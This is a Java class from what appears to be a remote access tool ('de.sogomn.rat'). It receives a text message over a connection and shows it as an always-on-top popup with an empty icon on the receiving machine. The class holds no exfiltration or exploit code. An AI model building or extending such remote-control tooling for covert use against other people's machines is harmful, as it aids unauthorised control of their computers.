package de.sogomn.rat.packet;

import javax.swing.JDialog;
import javax.swing.JOptionPane;

import de.sogomn.engine.util.ImageUtils;
import de.sogomn.rat.ActiveConnection;



public final class PopupPacket implements IPacket {
	
	private String message;
	
	public PopupPacket(final String message) {
		this.message = message;
	}
	
	public PopupPacket() {
		this("");
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		connection.writeUTF(message);
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		message = connection.readUTF();
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		final JOptionPane optionPane = new JOptionPane(message);
		final JDialog dialog = optionPane.createDialog(null);
		
		dialog.setAlwaysOnTop(true);
		dialog.setIconImage(ImageUtils.EMPTY_IMAGE);
		dialog.setModal(false);
		dialog.setVisible(true);
	}
	
	public String getMessage() {
		return message;
	}
	
}
